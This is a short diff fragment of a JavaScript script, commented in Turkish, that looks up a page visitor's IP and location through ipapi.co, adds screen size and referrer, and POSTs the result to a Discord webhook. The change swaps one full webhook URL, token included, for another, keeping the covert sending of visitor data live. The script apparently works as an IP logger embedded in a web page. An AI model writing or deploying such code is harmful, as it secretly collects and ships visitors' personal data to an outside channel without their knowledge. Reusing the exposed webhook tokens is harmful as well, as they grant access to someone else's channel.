@@ -46,7 +46,7 @@ fetch('https://ipapi.co/json/')
       'Ekran Genişliği: ' + ekranGenislik + '*' + ekranYukseklik + '\n' +
       'Referrer: ' + referrer; // Sayfa referansını mesajın sonuna ekle
 
-    var webhookURL = 'https://discord.com/api/webhooks/1125334024328597514/9RPHIBPRqXQrbzDOTRMNtjGe0u6SGNHjwD8JoXAcU6Q6u1itE1c7-1g5ive4wh_WUZZR';
+    var webhookURL = 'https://discord.com/api/webhooks/1172062971162263603/k0S2vAlwgC6BYDjucH8yaqXz2-lI4aA4Acb0FQ6VeUaWyzOc4ses3eIJKDp6lCYNfNjf';
 
     fetch(webhookURL, {
       method: 'POST',
